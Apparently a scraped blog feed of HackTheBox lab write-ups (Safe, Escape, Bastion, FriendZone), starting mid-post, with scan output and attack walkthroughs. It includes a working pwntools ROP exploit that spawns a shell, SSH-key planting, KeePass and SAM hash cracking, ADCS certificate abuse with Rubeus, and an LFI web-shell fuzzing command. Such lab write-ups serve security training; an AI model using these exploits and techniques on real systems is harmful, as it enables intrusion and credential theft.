12:07:04 up 1:02, 0 users, load average: 0.09, 0.04, 0.09 | What do you want me to echo back? OPTIONS / HTTP/1.0 | Help: | 12:07:20 up 1:02, 0 users, load average: 0.06, 0.03, 0.09 | What do you want me to echo back? HELP | NULL: | 12:06:57 up 1:02, 0 users, load average: 0.10, 0.04, 0.09 | RPCCheck: | 12:07:05 up 1:02, 0 users, load average: 0.08, 0.04, 0.09 | RTSPRequest: | 12:07:04 up 1:02, 0 users, load average: 0.09, 0.04, 0.09 | What do you want me to echo back? OPTIONS / RTSP/1.0 | SSLSessionReq, TerminalServerCookie: | 12:07:21 up 1:02, 0 users, load average: 0.06, 0.03, 0.09 | What do you want me to echo back? | TLSSessionReq: | 12:07:22 up 1:02, 0 users, load average: 0.06, 0.03, 0.09 |_ What do you want me to echo back? 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port1337-TCP:V=7.93%I=7%D=6/24%Time=649714C5%P=x86_64-pc-linux-gnu%r(NU SF:LL,3E,\u0026#34;\\x2012:06:57\\x20up\\x20\\x201:02,\\x20\\x200\\x20users,\\x20\\x20load\\x SF:20average:\\x200\\.10,\\x200\\.04,\\x200\\.09\\n\u0026#34;)%r(GenericLines,63,\u0026#34;\\x2012:0 SF:6:57\\x20up\\x20\\x201:02,\\x20\\x200\\x20users,\\x20\\x20load\\x20average:\\x200 SF:\\.10,\\x200\\.04,\\x200\\.09\\n\\nWhat\\x20do\\x20you\\x20want\\x20me\\x20to\\x20ec SF:ho\\x20back\\?\\x20\\r\\n\u0026#34;)%r(GetRequest,71,\u0026#34;\\x2012:07:03\\x20up\\x20\\x201:02, SF:\\x20\\x200\\x20users,\\x20\\x20load\\x20average:\\x200\\.09,\\x200\\.04,\\x200\\.0 SF:9\\n\\nWhat\\x20do\\x20you\\x20want\\x20me\\x20to\\x20echo\\x20back\\?\\x20GET\\x20 SF:/\\x20HTTP/1\\.0\\r\\n\u0026#34;)%r(HTTPOptions,75,\u0026#34;\\x2012:07:04\\x20up\\x20\\x201:02,\\ SF:x20\\x200\\x20users,\\x20\\x20load\\x20average:\\x200\\.09,\\x200\\.04,\\x200\\.09 SF:\\n\\nWhat\\x20do\\x20you\\x20want\\x20me\\x20to\\x20echo\\x20back\\?\\x20OPTIONS\\ SF:x20/\\x20HTTP/1\\.0\\r\\n\u0026#34;)%r(RTSPRequest,75,\u0026#34;\\x2012:07:04\\x20up\\x20\\x201:0 SF:2,\\x20\\x200\\x20users,\\x20\\x20load\\x20average:\\x200\\.09,\\x200\\.04,\\x200\\ SF:.09\\n\\nWhat\\x20do\\x20you\\x20want\\x20me\\x20to\\x20echo\\x20back\\?\\x20OPTIO SF:NS\\x20/\\x20RTSP/1\\.0\\r\\n\u0026#34;)%r(RPCCheck,3E,\u0026#34;\\x2012:07:05\\x20up\\x20\\x201:0 SF:2,\\x20\\x200\\x20users,\\x20\\x20load\\x20average:\\x200\\.08,\\x200\\.04,\\x200\\ SF:.09\\n\u0026#34;)%r(DNSVersionBindReqTCP,3E,\u0026#34;\\x2012:07:10\\x20up\\x20\\x201:02,\\x20\\ SF:x200\\x20users,\\x20\\x20load\\x20average:\\x200\\.08,\\x200\\.03,\\x200\\.09\\n\u0026#34;) SF:%r(DNSStatusRequestTCP,3E,\u0026#34;\\x2012:07:15\\x20up\\x20\\x201:02,\\x20\\x200\\x20 SF:users,\\x20\\x20load\\x20average:\\x200\\.07,\\x200\\.03,\\x200\\.09\\n\u0026#34;)%r(Help, SF:67,\u0026#34;\\x2012:07:20\\x20up\\x20\\x201:02,\\x20\\x200\\x20users,\\x20\\x20load\\x20a SF:verage:\\x200\\.06,\\x200\\.03,\\x200\\.09\\n\\nWhat\\x20do\\x20you\\x20want\\x20me SF:\\x20to\\x20echo\\x20back\\?\\x20HELP\\r\\n\u0026#34;)%r(SSLSessionReq,64,\u0026#34;\\x2012:07:21 SF:\\x20up\\x20\\x201:02,\\x20\\x200\\x20users,\\x20\\x20load\\x20average:\\x200\\.06 SF:,\\x200\\.03,\\x200\\.09\\n\\nWhat\\x20do\\x20you\\x20want\\x20me\\x20to\\x20echo\\x SF:20back\\?\\x20\\x16\\x03\\n\u0026#34;)%r(TerminalServerCookie,63,\u0026#34;\\x2012:07:21\\x20up\\ SF:x20\\x201:02,\\x20\\x200\\x20users,\\x20\\x20load\\x20average:\\x200\\.06,\\x200\\ SF:.03,\\x200\\.09\\n\\nWhat\\x20do\\x20you\\x20want\\x20me\\x20to\\x20echo\\x20back\\ SF:?\\x20\\x03\\n\u0026#34;)%r(TLSSessionReq,64,\u0026#34;\\x2012:07:22\\x20up\\x20\\x201:02,\\x20\\x SF:200\\x20users,\\x20\\x20load\\x20average:\\x200\\.06,\\x200\\.03,\\x200\\.09\\n\\nW SF:hat\\x20do\\x20you\\x20want\\x20me\\x20to\\x20echo\\x20back\\?\\x20\\x16\\x03\\n\u0026#34;); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 100.88 seconds gobuster â””â”€$ gobuster dir -u http://10.10.10.147 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x html,txt,php =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.147 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: html,txt,php [+] Timeout: 10s =============================================================== 2023/06/24 16:22:12 Starting gobuster in directory enumeration mode =============================================================== /.html (Status: 403) [Size: 292] /index.html (Status: 200) [Size: 10787] /manual (Status: 301) [Size: 313] [--\u0026gt; http://10.10.10.147/manual/] /.html (Status: 403) [Size: 292] /server-status (Status: 403) [Size: 300] Web server has a hint about the port 1337 Visting path /myapp downloads myapp Let\u0026rsquo;s check port 1337 myapp file Foothold/User Let\u0026rsquo;s debug myapp main function The variable is 0x70 bytes away from the top of the stack Let\u0026rsquo;s find an offset Type set follow-fork-mode parent since pwndbg and peda sets follow mode to child, while gdb sets it to parent by default Create pattern: msf-pattern_create -l 150 Run and input the pattern Search the offset: msf-pattern_offset -q Ae0A (based on screen) We can check if the offset found is correct Execute: python3 -c 'print(\u0026quot;A\u0026quot;*120 + \u0026quot;B\u0026quot; * 8)' Run and input the string generated Okay, now we need to come up with a strategy I also found test function, which is never called We can try putting system address to r13 and place /bin/sh on top of the stack And then call test() Which should give us a shell But we need a gadget to put system to r13 Let\u0026rsquo;s search for gadgets We can do it with ropper Install: sudo apt install ropper Run: ropper myapp | grep r13 We can choose 2-nd option Our final exploit #MAIN: 0040115f #pop r13: 00401206 #test: 00401152 #system: 0040116e from pwn import * p = remote(\u0026#34;10.10.10.147\u0026#34;, 1337) context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;amd64\u0026#39;) padding = (\u0026#34;A\u0026#34; * 112).encode() payload = \u0026#34;/bin/sh\\x00\u0026#34;.encode() ret_system = p64(0x40116e) pop_r13 = p64(0x401206) junk = p64(0x0) ret_test = p64(0x401152) p.sendline(padding + payload + pop_r13 + ret_system + junk + junk + ret_test) p.interactive() Let\u0026rsquo;s run it Root Enumerate for privesc We see MyPasswords.kdbx And also other jpg files We can upgrade our shell via ssh, so we can download the file cd /home/user/.ssh/ If you have generated id_rsa key, simply use the value in id_rsa.pub and save it to authorized_keys like down below If not, generate it and do the same thing $ echo 'ssh-rsa AAAAB3NzaC1yc2EA...' \u0026gt; authorized_keys ssh to box using your id_rsa: ssh -i id_rsa user@10.10.10.147 Now we can download MyPasswords.kdbx and JPG files scp -i id_rsa user@10.10.10.147:~/MyPasswords.kdbx ./ scp -i ~/.ssh/id_rsa user@10.10.10.147:~/*.JPG ./ Since there is an option to protect DB file using key file We can assume that those JPG file as key files, so we can create hashes for each of the six images as keyfiles for i in *.JPG; do (keepass2john -k $i MyPasswords.kdbx \u0026gt;\u0026gt; hashes.txt); done; Use john to crack the hashes Once we get our password we can use it to explore MyPasswords.kdbx We see the Root password entry Use it to su ","date":"June 23, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/safe/images/safe.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/safe/","summary":"Safe Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.147 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-24 17:07 BST Nmap scan report for 10.10.10.147 (10.10.10.147) Host is up (0.11s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 6d7c813d6a3df95f2e1f6a97e500bade (RSA) | 256 997e1e227672da3cc9617d74d78033d2 (ECDSA) |_ 256 6a6bc38e4b28f76085b162ff54bcd8d6 (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) |_http-title: Apache2 Debian Default Page: It works |_http-server-header: Apache/2.","tags":["HTB"],"title":"[HTB] Machine: Safe"},{"categories":null,"contents":"Escape Enumeration nmap â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nmap -Pn -p53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,4966,49689,49690,49706,49714,58597 10.10.11.202 -T4 -sC -sV Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-21 09:24 EDT Nmap scan report for 10.10.11.202 (10.10.11.202) Host is up (0.16s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-05-21 21:24:13Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name) |_ssl-date: 2023-05-21T21:25:47+00:00; +7h59m35s from scanner time. | ssl-cert: Subject: commonName=dc.sequel.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc.sequel.htb | Not valid before: 2022-11-18T21:20:35 |_Not valid after: 2023-11-18T21:20:35 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc.sequel.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc.sequel.htb | Not valid before: 2022-11-18T21:20:35 |_Not valid after: 2023-11-18T21:20:35 |_ssl-date: 2023-05-21T21:25:47+00:00; +7h59m35s from scanner time. 1433/tcp open ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM |_ssl-date: 2023-05-21T21:25:46+00:00; +7h59m36s from scanner time. | ms-sql-ntlm-info: | 10.10.11.202:1433: | Target_Name: sequel | NetBIOS_Domain_Name: sequel | NetBIOS_Computer_Name: DC | DNS_Domain_Name: sequel.htb | DNS_Computer_Name: dc.sequel.htb | DNS_Tree_Name: sequel.htb |_ Product_Version: 10.0.17763 | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback | Not valid before: 2023-05-19T20:14:37 |_Not valid after: 2053-05-19T20:14:37 | ms-sql-info: | 10.10.11.202:1433: | Version: | name: Microsoft SQL Server 2019 RTM | number: 15.00.2000.00 | Product: Microsoft SQL Server 2019 | Service pack level: RTM | Post-SP patches applied: false |_ TCP port: 1433 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name) |_ssl-date: 2023-05-21T21:25:47+00:00; +7h59m35s from scanner time. | ssl-cert: Subject: commonName=dc.sequel.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc.sequel.htb | Not valid before: 2022-11-18T21:20:35 |_Not valid after: 2023-11-18T21:20:35 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc.sequel.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc.sequel.htb | Not valid before: 2022-11-18T21:20:35 |_Not valid after: 2023-11-18T21:20:35 |_ssl-date: 2023-05-21T21:25:47+00:00; +7h59m36s from scanner time. 4966/tcp filtered unknown 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 9389/tcp open mc-nmf .NET Message Framing 49689/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49690/tcp open msrpc Microsoft Windows RPC 49706/tcp open msrpc Microsoft Windows RPC 49714/tcp open msrpc Microsoft Windows RPC 58597/tcp open msrpc Microsoft Windows RPC Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 311: |_ Message signing enabled and required | smb2-time: | date: 2023-05-21T21:25:07 |_ start_date: N/A |_clock-skew: mean: 7h59m35s, deviation: 0s, median: 7h59m34s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 102.84 seconds smb We see a pdf file We have the creds in Bonus section Foothold Let\u0026rsquo;s check creds from pdf We have an access So I connected to SQL and tried enumerating it using the hacktricks checklist Checked sql_users Checked linked_servers Then I noticed I got to the part with NTLM and Relay attacks Let\u0026rsquo;s try stealing hash And we get sql_svc\u0026rsquo;s hash Let\u0026rsquo;s crack it Use evil-winrm to connect to box User I spent a significant time enumerating the box to get a user I noticed a SQLServer logs Where we can find user creds Now we get our user Root During enumeration, I noticed user certificates pop up in user\u0026rsquo;s object Moreover the name of the box is Escape, so I thought it could be related to ESC attacks targeting ADCS So let\u0026rsquo;s upload certify and run it to find vulnerable certificate templates Okay, we find one Let\u0026rsquo;s google a bit to find a suitable attack Let\u0026rsquo;s request a certificate, since we have a UserAuthentification Now, we need to convert it to pfx Now we can upload pfx to box and use Rubeus for ptt attack SharpCollection to download Rubeus Let\u0026rsquo;s check tgt We\u0026rsquo;re adminstrator However I could enter Administrator\u0026rsquo;s folders It looks like it doesn\u0026rsquo;t work with evil-winrm So I was able to access them using alternative way with certipy Notice that I sync my time with the time of the box Note: Looks like there was a way to dump the hashes from evil-winrm .\\Rubeus.exe asktgt /user:administrator /certificate:\u0026lt;Certificate\u0026gt; /getcredentials /show /nowrap ","date":"June 17, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/escape/images/escape.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/escape/","summary":"Escape Enumeration nmap â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nmap -Pn -p53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,4966,49689,49690,49706,49714,58597 10.10.11.202 -T4 -sC -sV Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-21 09:24 EDT Nmap scan report for 10.10.11.202 (10.10.11.202) Host is up (0.16s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-05-21 21:24:13Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: sequel.","tags":["HTB"],"title":"[HTB] Machine: Escape"},{"categories":null,"contents":"Bastion Enumeration nmap â””â”€$ nmap -Pn -sC -sV 10.10.10.134 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-17 21:20 BST Nmap scan report for 10.10.10.134 (10.10.10.134) Host is up (0.13s latency). Not shown: 996 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH for_Windows_7.9 (protocol 2.0) | ssh-hostkey: | 2048 3a56ae753c780ec8564dcb1c22bf458a (RSA) | 256 cc2e56ab1997d5bb03fb82cd63da6801 (ECDSA) |_ 256 935f5daaca9f53e7f282e664a8a3a018 (ED25519) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2023-06-17T20:20:50 |_ start_date: 2023-06-17T18:27:22 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_clock-skew: mean: -40m29s, deviation: 1h09m15s, median: -30s | smb2-security-mode: | 311: |_ Message signing enabled but not required | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: Bastion | NetBIOS computer name: BASTION\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2023-06-17T22:20:49+02:00 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 40.14 seconds smbmap â””â”€$ smbmap -H 10.10.10.134 -R -u pentest [+] Guest session IP: 10.10.10.134:445 Name: 10.10.10.134 [-] Work[!] Unable to remove test directory at \\\\10.10.10.134\\Backups\\UEQFPWNJOX, please remove manually Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin Backups READ, WRITE .\\Backups\\* dr--r--r-- 0 Sun Jun 18 09:58:58 2023 . dr--r--r-- 0 Sun Jun 18 09:58:58 2023 .. fw--w--w-- 116 Tue Apr 16 12:43:19 2019 note.txt fr--r--r-- 0 Fri Feb 22 12:43:28 2019 SDT65CB.tmp dr--r--r-- 0 Sun Jun 18 09:58:58 2023 UEQFPWNJOX dr--r--r-- 0 Fri Feb 22 12:44:02 2019 WindowsImageBackup .\\Backups\\WindowsImageBackup\\* dr--r--r-- 0 Fri Feb 22 12:44:02 2019 . dr--r--r-- 0 Fri Feb 22 12:44:02 2019 .. dr--r--r-- 0 Fri Feb 22 12:45:32 2019 L4mpje-PC .\\Backups\\WindowsImageBackup\\L4mpje-PC\\* dr--r--r-- 0 Fri Feb 22 12:45:32 2019 . dr--r--r-- 0 Fri Feb 22 12:45:32 2019 .. dr--r--r-- 0 Fri Feb 22 12:45:32 2019 Backup 2019-02-22 124351 dr--r--r-- 0 Fri Feb 22 12:45:32 2019 Catalog fr--r--r-- 16 Fri Feb 22 12:44:02 2019 MediaId dr--r--r-- 0 Fri Feb 22 12:45:32 2019 SPPMetadataCache .\\Backups\\WindowsImageBackup\\L4mpje-PC\\Backup 2019-02-22 124351\\* dr--r--r-- 0 Fri Feb 22 12:45:32 2019 . dr--r--r-- 0 Fri Feb 22 12:45:32 2019 .. fr--r--r-- 37761024 Fri Feb 22 12:44:03 2019 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd fr--r--r-- 5418299392 Fri Feb 22 12:45:32 2019 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd fr--r--r-- 1186 Fri Feb 22 12:45:32 2019 BackupSpecs.xml fr--r--r-- 1078 Fri Feb 22 12:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml fr--r--r-- 8930 Fri Feb 22 12:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml fr--r--r-- 6542 Fri Feb 22 12:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml fr--r--r-- 2894 Fri Feb 22 12:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml fr--r--r-- 1488 Fri Feb 22 12:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml fr--r--r-- 1484 Fri Feb 22 12:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml fr--r--r-- 3844 Fri Feb 22 12:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml fr--r--r-- 3988 Fri Feb 22 12:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml fr--r--r-- 7110 Fri Feb 22 12:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml fr--r--r-- 2374620 Fri Feb 22 12:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml .\\Backups\\WindowsImageBackup\\L4mpje-PC\\Catalog\\* dr--r--r-- 0 Fri Feb 22 12:45:32 2019 . dr--r--r-- 0 Fri Feb 22 12:45:32 2019 .. fr--r--r-- 5698 Fri Feb 22 12:45:32 2019 BackupGlobalCatalog fr--r--r-- 7440 Fri Feb 22 12:45:32 2019 GlobalCatalog .\\Backups\\WindowsImageBackup\\L4mpje-PC\\SPPMetadataCache\\* dr--r--r-- 0 Fri Feb 22 12:45:32 2019 . dr--r--r-- 0 Fri Feb 22 12:45:32 2019 .. fr--r--r-- 57848 Fri Feb 22 12:45:32 2019 {cd113385-65ff-4ea2-8ced-5630f6feca8f} C$ NO ACCESS Default share IPC$ READ ONLY Remote IPC .\\IPC$\\* fr--r--r-- 3 Sun Dec 31 23:58:45 1600 InitShutdown fr--r--r-- 4 Sun Dec 31 23:58:45 1600 lsass fr--r--r-- 3 Sun Dec 31 23:58:45 1600 ntsvcs fr--r--r-- 3 Sun Dec 31 23:58:45 1600 scerpc fr--r--r-- 1 Sun Dec 31 23:58:45 1600 Winsock2\\CatalogChangeListener-2fc-0 fr--r--r-- 3 Sun Dec 31 23:58:45 1600 epmapper fr--r--r-- 1 Sun Dec 31 23:58:45 1600 Winsock2\\CatalogChangeListener-1e8-0 fr--r--r-- 3 Sun Dec 31 23:58:45 1600 LSM_API_service fr--r--r-- 3 Sun Dec 31 23:58:45 1600 eventlog fr--r--r-- 1 Sun Dec 31 23:58:45 1600 Winsock2\\CatalogChangeListener-3b8-0 fr--r--r-- 3 Sun Dec 31 23:58:45 1600 atsvc fr--r--r-- 4 Sun Dec 31 23:58:45 1600 wkssvc fr--r--r-- 1 Sun Dec 31 23:58:45 1600 Winsock2\\CatalogChangeListener-364-0 fr--r--r-- 3 Sun Dec 31 23:58:45 1600 trkwks fr--r--r-- 3 Sun Dec 31 23:58:45 1600 spoolss fr--r--r-- 1 Sun Dec 31 23:58:45 1600 Winsock2\\CatalogChangeListener-66c-0 fr--r--r-- 3 Sun Dec 31 23:58:45 1600 W32TIME_ALT fr--r--r-- 1 Sun Dec 31 23:58:45 1600 openssh-ssh-agent fr--r--r-- 4 Sun Dec 31 23:58:45 1600 srvsvc fr--r--r-- 1 Sun Dec 31 23:58:45 1600 vgauth-service fr--r--r-- 1 Sun Dec 31 23:58:45 1600 Winsock2\\CatalogChangeListener-5ec-0 fr--r--r-- 1 Sun Dec 31 23:58:45 1600 Winsock2\\CatalogChangeListener-264-0 fr--r--r-- 1 Sun Dec 31 23:58:45 1600 Winsock2\\CatalogChangeListener-26c-0 Foothold Let\u0026rsquo;s check the note.txt We see 2 vhd files, let\u0026rsquo;s check them apt install guestmount - so we can mount vhd mount -t cifs //10.10.10.134/backups /mnt -o user=,password= guestmount --add /mnt/smb/WindowsImageBackup/L4mpje-PC/Backup\\ 2019-02-22\\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/disk Go to Windows/System32/config and dump the hashes Crack the hashes Connect to ssh Root Let\u0026rsquo;s enumerate Let\u0026rsquo;s check installed software We see mRemoteNG Let\u0026rsquo;s find it\u0026rsquo;s config file: confCons.xml According to docs it should be located in %AppData%\\mRemoteNG Let\u0026rsquo;s open it Decypher the password using mRemoteNG Decrypt And connect via ssh ","date":"June 16, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/bastion/images/bastion.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/bastion/","summary":"Bastion Enumeration nmap â””â”€$ nmap -Pn -sC -sV 10.10.10.134 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-17 21:20 BST Nmap scan report for 10.10.10.134 (10.10.10.134) Host is up (0.13s latency). Not shown: 996 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH for_Windows_7.9 (protocol 2.0) | ssh-hostkey: | 2048 3a56ae753c780ec8564dcb1c22bf458a (RSA) | 256 cc2e56ab1997d5bb03fb82cd63da6801 (ECDSA) |_ 256 935f5daaca9f53e7f282e664a8a3a018 (ED25519) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2023-06-17T20:20:50 |_ start_date: 2023-06-17T18:27:22 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_clock-skew: mean: -40m29s, deviation: 1h09m15s, median: -30s | smb2-security-mode: | 311: |_ Message signing enabled but not required | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.","tags":["HTB"],"title":"[HTB] Machine: Bastion"},{"categories":null,"contents":"FriendZone Enumeration nmap â””â”€$ nmap -Pn -sC -sV 10.10.10.123 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-18 15:55 BST Nmap scan report for 10.10.10.123 (10.10.10.123) Host is up (0.13s latency). Not shown: 993 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a96824bc971f1e54a58045e74cd9aaa0 (RSA) | 256 e5440146ee7abb7ce91acb14999e2b8e (ECDSA) |_ 256 004e1a4f33e8a0de86a6e42a5f84612b (ED25519) 53/tcp open domain ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.11.3-1ubuntu1.2-Ubuntu 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Friend Zone Escape software 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 443/tcp open ssl/http Apache httpd 2.4.29 | tls-alpn: |_ http/1.1 | ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO | Not valid before: 2018-10-05T21:02:30 |_Not valid after: 2018-11-04T21:02:30 |_http-server-header: Apache/2.4.29 (Ubuntu) |_ssl-date: TLS randomness does not represent time |_http-title: 404 Not Found 445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP) Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: mean: -1h00m29s, deviation: 1h43m54s, median: -30s | smb2-time: | date: 2023-06-18T14:55:52 |_ start_date: N/A | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 000000000000 (Xerox) | smb-os-discovery: | OS: Windows 6.1 (Samba 4.7.6-Ubuntu) | Computer name: friendzone | NetBIOS computer name: FRIENDZONE\\x00 | Domain name: \\x00 | FQDN: friendzone |_ System time: 2023-06-18T17:55:53+03:00 | smb2-security-mode: | 311: |_ Message signing enabled but not required Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 40.94 seconds smbmap â””â”€$ smbmap -H 10.10.10.123 -R [+] Guest session IP: 10.10.10.123:445 Name: 10.10.10.123 Disk Permissions Comment ---- ----------- ------- print$ NO ACCESS Printer Drivers Files NO ACCESS FriendZone Samba Server Files /etc/Files general READ ONLY FriendZone Samba Server Files .\\general\\* dr--r--r-- 0 Wed Jan 16 20:10:51 2019 . dr--r--r-- 0 Tue Sep 13 15:56:24 2022 .. fr--r--r-- 57 Wed Oct 10 00:52:42 2018 creds.txt Development READ, WRITE FriendZone Samba Server Files .\\Development\\* dr--r--r-- 0 Sun Jun 18 16:10:05 2023 . dr--r--r-- 0 Tue Sep 13 15:56:24 2022 .. IPC$ NO ACCESS IPC Service (FriendZone server (Samba, Ubuntu)) Creds Web server gobuster dig axfr Foothold https://administrator1.friendzone.red/ Use the creds from smb Let\u0026rsquo;s test params It seems like image_id provides nothing Let\u0026rsquo;s try pagename It seems like it appends .php to parameter Let\u0026rsquo;s get source code Used CyberChef for decoding We can have a LFI We had a read, write permissions on Development share Maybe we can put our web-shell, but we have to find the location of the Development folder Let\u0026rsquo;s upload a web-shell and search for it Let\u0026rsquo;s generate wordlist for root directories And use it for fuzzing wfuzz -c -w ./root_dirs -H 'Cookie: FriendZoneAuth=e7749d0f4b4da5d03e6e9196fd1d18f1' 'https://administrator1.friendzone.red/dashboard.php?image_id=\u0026amp;pagename=../../..FUZZ/Development/shell\u0026amp;cmd=id' And we find 